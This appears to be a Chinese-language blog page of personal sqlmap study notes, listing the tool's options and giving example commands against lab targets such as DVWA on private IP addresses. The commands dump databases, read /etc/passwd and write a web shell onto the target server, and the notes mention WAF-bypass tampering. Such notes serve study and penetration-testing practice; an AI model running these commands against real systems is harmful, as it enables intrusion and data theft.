@@ -1,0 +1,763 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="https://images.atsud0.me/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="https://images.atsud0.me/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="https://images.atsud0.me/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="https://images.atsud0.me/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"atsud0.me","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="sqlmap能让你生活更轻松…~">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sqlmap学习笔记">
+<meta property="og:url" content="http://atsud0.me/2020/05/15/sqlmap%E7%AC%94%E8%AE%B0/index.html">
+<meta property="og:site_name" content="雪之下二丁目鹤岗八幡宫">
+<meta property="og:description" content="sqlmap能让你生活更轻松…~">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2020-05-15T11:44:44.000Z">
+<meta property="article:modified_time" content="2020-11-19T10:02:45.099Z">
+<meta property="article:author" content="atsud0">
+<meta property="article:tag" content="sql_injection">
+<meta property="article:tag" content="sqlmap">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://atsud0.me/2020/05/15/sqlmap%E7%AC%94%E8%AE%B0/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>sqlmap学习笔记 | 雪之下二丁目鹤岗八幡宫</title>
+  
+    <script>
+      function sendPageView() {
+        if (CONFIG.hostname !== location.hostname) return;
+        var uid = localStorage.getItem('uid') || (Math.random() + '.' + Math.random());
+        localStorage.setItem('uid', uid);
+        navigator.sendBeacon('https://www.google-analytics.com/collect', new URLSearchParams({
+          v  : 1,
+          tid: 'UA-163969429-1',
+          cid: uid,
+          t  : 'pageview',
+          dp : encodeURIComponent(location.pathname)
+        }));
+      }
+      document.addEventListener('pjax:complete', sendPageView);
+      sendPageView();
+    </script>
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">雪之下二丁目鹤岗八幡宫</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/index.html" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">166</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">10</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">128</span></a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://atsud0.me/2020/05/15/sqlmap%E7%AC%94%E8%AE%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://images.atsud0.me/images/atsud0-avator.jpg">
+      <meta itemprop="name" content="atsud0">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="雪之下二丁目鹤岗八幡宫">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          sqlmap学习笔记
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2020-05-15 19:44:44" itemprop="dateCreated datePublished" datetime="2020-05-15T19:44:44+08:00">2020-05-15</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2020-11-19 18:02:45" itemprop="dateModified" datetime="2020-11-19T18:02:45+08:00">2020-11-19</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Note/" itemprop="url" rel="index"><span itemprop="name">Note</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Note/Tools/" itemprop="url" rel="index"><span itemprop="name">Tools</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">Symbols count in article: </span>
+              <span>5.1k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">Reading time &asymp;</span>
+              <span>5 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>sqlmap能让你生活更轻松…~</p>
+<a id="more"></a>
+
+<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>安装:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -S sqlmap</span><br></pre></td></tr></table></figure>
+
+<p>windows系统下安装好python3并添加好python的环境变量后,直接将sqlmap的整个文件目录放到python安装目录下</p>
+<ul>
+<li>新建一个快捷方式-cmd</li>
+<li>名称随便</li>
+<li>右键cmd属性,将起始位置修改为sqlmap目录</li>
+</ul>
+<p>参考链接:</p>
+<ul>
+<li><a href="https://zhzhdoai.github.io/2019/02/25/sqlmap%E6%93%8D%E4%BD%9C(sqlilabs)/" target="_blank" rel="noopener">sqlmap操作详解(常用备忘录)</a></li>
+<li><a href="https://xz.aliyun.com/t/5982#toc-4" target="_blank" rel="noopener">Sqlmap学习使用小总结</a></li>
+<li><a href="https://octobug.gitbooks.io/sqlmap-wiki-zhcn/content/Users-manual/Usage/Detection.html" target="_blank" rel="noopener">sqlmap使用手册</a></li>
+<li><a href="https://xz.aliyun.com/t/3010" target="_blank" rel="noopener">落花四月-sqlmap-1</a></li>
+<li><a href="https://xz.aliyun.com/t/3011" target="_blank" rel="noopener">落花四月-sqlmap-2</a></li>
+</ul>
+<h1 id="帮助列表-部分"><a href="#帮助列表-部分" class="headerlink" title="帮助列表(部分)"></a>帮助列表(部分)</h1><p>sql 基本参数<br>要想更详细,请<code>-hh</code></p>
+<ul>
+<li>-h 帮助信息</li>
+<li>-hh 更详细的帮助</li>
+<li>-u 指定url(GET请求要手动输入好注入点,sqlmap不会自动帮你检测)</li>
+<li>-m url列表(扫描多个)</li>
+<li>-r 加载HTTP请求文件(POST)</li>
+<li>-l 从请求日志文件中查找注入点</li>
+<li>-g google dork(google hacking)</li>
+<li>-c 指定配置文件</li>
+<li>-p 指定扫描的参数 -p “user-agent,referer” 如果指定了user-agent测试,那么不设置–level也能测试user-agent了</li>
+<li>–skip 排除指定的扫描参数</li>
+<li>-A 指定User-Agent信息</li>
+<li>-H 指定请求头信息</li>
+<li>–user-agents=””(指定user-agent)</li>
+<li>–random-agent (level&gt;=3才启用 sqlmap检查user-agent的注入点)</li>
+<li>–host 在主机信息头部注入,level=5</li>
+<li>–referer referer头信息,level&gt;=3</li>
+<li>–headers 头部信息必须使用<code>\n</code>换行,因为http请求头每个占用一行</li>
+<li>–method=GET/POST 指定http请求为</li>
+<li>–data 数据段 get/post都适用(主要用于post)</li>
+<li>–param-del 变量分隔符</li>
+<li>–cookie 检测cookie信息,(格式–cookie=”a=123;b=123”)</li>
+<li>set-cookie 检查cookie中的注入点 lever为2</li>
+<li>–batch 检测注入点</li>
+<li>–dbms 指定后端数据库</li>
+<li>–os 指定系统linux/windows</li>
+<li>-f 数据库系统指纹信息</li>
+<li>-b DBMS操作系统等信息</li>
+<li>–lever=[num] 设置等级(1-5)默认1级 级别越高探测信息越多,但是速度越慢<ul>
+<li>&gt;=2 cookie</li>
+<li>&gt;=3 user-agent &amp;&amp; Referef</li>
+<li>&gt;=5 host</li>
+</ul>
+</li>
+<li>–risk=[num] 设置风险等级(1-3)默认1级 (风险越高会测试更多语句,如插入语句,更新语句,删除语句等级越高<strong>入狱</strong>可能性越高)<ul>
+<li>1 大部分测试语句</li>
+<li>2 增加基于事件的测试语句</li>
+<li>3 增加or语句的sql注入测试(在update的语句中注入一个or的测试语句,可能导致整个表的更新)</li>
+<li>测试的语句可以在xml/payloads.xml中找到</li>
+</ul>
+</li>
+<li>–dump 导出</li>
+<li>–dbs 爆出所有数据库</li>
+<li>–current-db 爆出当前数据库名字</li>
+<li>–current-user 当前连接数据库的用户</li>
+<li>–privileges[-U] 用户权限</li>
+<li>–is-dba 判断当前用户是否为管理员</li>
+<li>–users 枚举数据库所有用户</li>
+<li>–tables 爆出数据库的表</li>
+<li>–columns 爆出所有列</li>
+<li>–schema 枚举information_schema</li>
+<li>-D [database_name]指定数据库枚举</li>
+<li>-T [table_name]指定数据表枚举</li>
+<li>-C [column_name]指定数据列枚举</li>
+<li>–common-tables暴力破解表</li>
+<li>–common-columns暴力破解列</li>
+<li>–os-shell 使用sqlmap获得一个交互shell</li>
+<li>–dump-all 导出所有数据</li>
+<li>-v[num] 0-6 设置信息输出等级,默认为1<ul>
+<li>0 显示pythobn错误以及严重的信息</li>
+<li>1 同时显示基本信息和警告信息</li>
+<li>2 同时显示debug信息</li>
+<li>3 同时显示注入的payload</li>
+<li>4 同时显示HTTP请求</li>
+<li>5 同时显示HTTP响应头</li>
+<li>6 同时显示HTTP响应页面</li>
+</ul>
+</li>
+<li>–proxy=[http/https/socks5/socks4]://address:port 设置代理</li>
+<li>–tor 使用tor代理(需要先配置好tor)</li>
+<li>–check-tor 检测tor代理是否已使用</li>
+<li>–second-url 双页面(dvwa-high)</li>
+<li>–threads 最大并发线程(最大10)</li>
+<li>-o开启前三个性能优化</li>
+<li>–start [num] 与–stop配合,在获取信息时只获取指定的起始数值条数</li>
+<li>–stop [num] 与–start配合,在获取信息时只获取指定的截止数值条数</li>
+<li>–technique 指定选择的查询技术<ul>
+<li>B: Boolean-based blind SQL injection（布尔型注入）</li>
+<li>E: Error-based SQL injection（报错型注入）</li>
+<li>U: UNION query SQL injection（可联合查询注入）</li>
+<li>S: Stacked queries SQL injection（堆叠注入）</li>
+<li>T: Time-based blind SQL injection（基于时间延迟注入</li>
+</ul>
+</li>
+<li>–-time-sec 设置延时时间(默认是五秒,在使用tor/网络状态不好时可以调高)</li>
+<li>–delay  下次请求的时间</li>
+<li>–timeout 请求超时时间</li>
+<li>–retrles 超时次数 默认三次</li>
+<li>–randomize 长度</li>
+<li>–scope 过滤日志内容(正则) 与<code>-l</code>配合使用</li>
+<li>–sklp-urlencode 跳过url编码(适用于原始编码的网站)</li>
+<li>–safe-url=[url] 设置目标网站能正常访问的地址作为安全链接地址(用于过滤一些防护)</li>
+<li>–safe-freq=[num] 设置访问安全连接地址的频率,测试多少次后访问一次安全链接地址</li>
+<li>–predict-output 优化性能,根据检测方法比对返回值和统计表内容,不断缩小检测范围,提高检测效率,与threads次数不兼容</li>
+<li>–keep-alive 使用https长连接(保持存活,避免重复建立连接的网络开销,大量长连接会严重占用服务器资源) 代理服务器不支持长连接(与–proxy不兼容和)</li>
+<li>–null-connection 获取相应的页面大小值,而非页面的具体内容,用于盲注降低网络资源消耗</li>
+<li>–invalid-bignum 使用大数据使参数取值失效 id=909999</li>
+<li>–invalid-logical 使用布尔判断使参数取值失效 id=13 and 18=19</li>
+<li>–invalid-string 使用随机字符串使参数取值失效</li>
+<li>–no-escape 不使用char()编码方式逃逸 <code>由于混淆和避免出错的目的,payload使用单引号界定字符串时,sqlmap使用char()编码逃逸方法替换字符串</code></li>
+<li>–tamper=”*.py” 过WAF</li>
+<li>–string</li>
+<li>–not-string</li>
+<li>–regexp</li>
+<li>–code</li>
+<li>–text-only</li>
+<li>–titles</li>
+<li>–hex 使用16进制编码</li>
+<li>–output-dir=/tmp 指定输出路径</li>
+<li>–save 将命令保存为一个文件</li>
+<li>-z 参数助记符</li>
+<li>–answer 指定答案</li>
+<li>–check-waf 检测WAF</li>
+<li>–mobile 模拟手机设备(修改user-agent为收集浏览器)</li>
+<li>–purge-output 清除output文件夹</li>
+<li>–smart当有大量检测目标时,选择基于错误的检测结果</li>
+<li>–wizard 交互性</li>
+<li>–crawl [num] 爬虫,爬取可能存在的漏洞链接 num是数字深度</li>
+<li>–forms 自动获取form表单测试</li>
+<li>–beep 发现sql注入时,发出蜂鸣</li>
+<li>–gpage 默认sqlmap使用前100个URL地址作为注入测试,对指定页面的URL测试</li>
+<li><code>*</code> 指定注入点(<a href="http://url//param1/value1*/param2/value2/" target="_blank" rel="noopener">http://url//param1/value1*/param2/value2/</a>) 跑伪静态网站</li>
+<li>–file-read=RFILE  读取操作</li>
+<li>–file-write=WFILE  写入操作</li>
+<li>–file-dest=DFILE  绝对路径写入</li>
+<li>–dns-domain  配合dns实现快速盲注</li>
+</ul>
+<h2 id="网站动态静态判断"><a href="#网站动态静态判断" class="headerlink" title="网站动态静态判断"></a>网站动态静态判断</h2><p><code>document.lastModified</code>(js函数)</p>
+<h2 id="基本步骤"><a href="#基本步骤" class="headerlink" title="基本步骤"></a>基本步骤</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1. 判断是否有注入</span><br><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;.......?id&#x3D;1&quot; --batch</span><br><span class="line">2. 查看所有数据库</span><br><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;.......?id&#x3D;1&quot; --dbs</span><br><span class="line">3. 查看当前使用的数据库</span><br><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;.......?id&#x3D;1&quot; --current-db</span><br><span class="line">4. 查看数据表</span><br><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;.......?id&#x3D;1&quot; -D security --tables</span><br><span class="line">5. 查看列名</span><br><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;.......?id&#x3D;1&quot; -D security -T users --columns</span><br><span class="line">6. 查看数据</span><br><span class="line">python sqlmap.py -u &quot;http:&#x2F;&#x2F;.......?id&#x3D;1&quot; -D security -T users --dump</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="双页面的sqlmap使用方法"><a href="#双页面的sqlmap使用方法" class="headerlink" title="双页面的sqlmap使用方法"></a>双页面的sqlmap使用方法</h2><p>例子:dvwa sql注入 high难度</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;192.168.2.243&#x2F;dvwa&#x2F;vulnerabilities&#x2F;sqli&#x2F;session-input.php&#x2F;&quot; --data&#x3D;&quot;id&#x3D;1&amp;Submit&#x3D;Submit&quot; --second-url&#x3D;&quot;http:&#x2F;&#x2F;192.168.2.243&#x2F;dvwa&#x2F;vulnerabilities&#x2F;sqli&#x2F;&quot; --current-db --cookie&#x3D;&quot;PHPSESSID&#x3D;p97k25g7mflas2kbg0asg7m161;security&#x3D;high&quot; --dbms&#x3D;mysql  -v 3 --dbs --threads&#x3D;10</span><br></pre></td></tr></table></figure>
+
+<p>因为是post请求的,所以要加数据段<code>--data</code>,因为dvwa靶场要登录,所以也要携带<code>cookie</code>值</p>
+<h2 id="safe-url用法"><a href="#safe-url用法" class="headerlink" title="safe-url用法"></a>safe-url用法</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;192.168.2.243&#x2F;sql&#x2F;less-1&#x2F;?id&#x3D;1&quot; --safe-url&#x3D;&quot;http:&#x2F;&#x2F;192.168.2.243&#x2F;sql&#x2F;less-1&#x2F;&quot; --safe-freq&#x3D;2 --dbms&#x3D;mysql</span><br></pre></td></tr></table></figure>
+
+<p>-u ‘url1’</p>
+<p>–safe-url=’url2’ 安全页面</p>
+<p>–safe-freq=2 </p>
+<p>意味着在测试两次<code>url1</code>后去访问一次安全页面<code>url2</code></p>
+<h2 id="写web-shell时会用到的参数"><a href="#写web-shell时会用到的参数" class="headerlink" title="写web shell时会用到的参数"></a>写web shell时会用到的参数</h2><ul>
+<li>–file-read=RFILE  读取操作</li>
+<li>–file-write=WFILE  写入操作</li>
+<li>–file-dest=DFILE  绝对路径写入</li>
+<li>–is-dba 判断当前用户是否为管理员</li>
+</ul>
+<p>读取文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;192.168.56.104&#x2F;jabcd0cs&#x2F;ajax_udf.php?q&#x3D;1&amp;add_value&#x3D;odm_user&quot; -p add_value --file-read&#x3D;&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
+
+<p>写文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;192.168.56.104&#x2F;jabcd0cs&#x2F;ajax_udf.php?q&#x3D;1&amp;add_value&#x3D;odm_user&quot; -p add_value --file-write&#x3D;&#x2F;data&#x2F;yjh.php --file-dest&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;jabc&#x2F;shell.php</span><br></pre></td></tr></table></figure>
+
+
+
+<p>tamper</p>
+<p><a href="https://xz.aliyun.com/t/2746" target="_blank" rel="noopener">https://xz.aliyun.com/t/2746</a></p>
+<p>mssql</p>
+<p><a href="https://www.anquanke.com/post/id/156911" target="_blank" rel="noopener">https://www.anquanke.com/post/id/156911</a></p>
+<p>免杀webshell</p>
+<p><a href="https://www.sqlsec.com/2020/07/shell.html#toc-heading-25" target="_blank" rel="noopener">https://www.sqlsec.com/2020/07/shell.html#toc-heading-25</a></p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:  </strong>atsud0
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link: </strong>
+    <a href="http://atsud0.me/2020/05/15/sqlmap%E7%AC%94%E8%AE%B0/" title="sqlmap学习笔记">http://atsud0.me/2020/05/15/sqlmap笔记/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/sql-injection/" rel="tag"><i class="fa fa-tag"></i> sql_injection</a>
+              <a href="/tags/sqlmap/" rel="tag"><i class="fa fa-tag"></i> sqlmap</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/05/15/%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E9%AA%87%E5%AE%A2/" rel="prev" title="搜索引擎骇客">
+      <i class="fa fa-chevron-left"></i> 搜索引擎骇客
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/05/15/sql%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/" rel="next" title="sql注入笔记">
+      sql注入笔记 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#安装"><span class="nav-number">1.</span> <span class="nav-text">安装</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#帮助列表-部分"><span class="nav-number">2.</span> <span class="nav-text">帮助列表(部分)</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#网站动态静态判断"><span class="nav-number">2.1.</span> <span class="nav-text">网站动态静态判断</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#基本步骤"><span class="nav-number">2.2.</span> <span class="nav-text">基本步骤</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#双页面的sqlmap使用方法"><span class="nav-number">2.3.</span> <span class="nav-text">双页面的sqlmap使用方法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#safe-url用法"><span class="nav-number">2.4.</span> <span class="nav-text">safe-url用法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#写web-shell时会用到的参数"><span class="nav-number">2.5.</span> <span class="nav-text">写web shell时会用到的参数</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="atsud0"
+      src="https://images.atsud0.me/images/atsud0-avator.jpg">
+  <p class="site-author-name" itemprop="name">atsud0</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">128</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/index.html">
+          
+        <span class="site-state-item-count">166</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/atsud0" title="GitHub → https://github.com/atsud0" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:admin@atsud0.me" title="E-Mail → mailto:admin@atsud0.me"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/atsud0" title="Twitter → https://twitter.com/atsud0" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://t.me/MindworkshopBot" title="Telegram → https://t.me/MindworkshopBot" rel="noopener" target="_blank"><i class="fab fa-telegram fa-fw"></i>Telegram</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://blog.ajin.cloud/" title="https://blog.ajin.cloud/" rel="noopener" target="_blank">ajin</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://leiblog.wang/" title="https://leiblog.wang/" rel="noopener" target="_blank">LeiWang</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://esonhugh.github.io/" title="https://esonhugh.github.io/" rel="noopener" target="_blank">Esonhugh</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://isabellainori.github.io/" title="https://isabellainori.github.io/" rel="noopener" target="_blank">Isabella Ross</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2020 – 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">atsud0</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+      <span class="post-meta-item-text">Symbols count total: </span>
+    <span title="Symbols count total">407k</span>
